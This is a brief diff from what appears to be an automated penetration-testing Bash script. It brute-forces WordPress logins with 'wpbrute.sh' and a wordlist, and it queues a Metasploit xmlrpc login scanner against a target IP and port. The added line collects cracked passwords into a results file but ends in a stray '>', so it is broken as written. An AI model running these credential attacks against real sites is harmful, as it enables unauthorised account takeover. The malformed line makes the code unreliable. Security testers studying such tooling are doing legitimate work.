@@ -198,6 +198,7 @@ then
 					# login normal							
 					wpbrute.sh --url=$url --user=$user --wordlist=top.txt >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
 					echo "" >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+					grep -i "The password is" logs/cracking/"$ip"_"$port"_wordpressPass.txt > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt > 
 
 					# login xmlrpc
 					echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
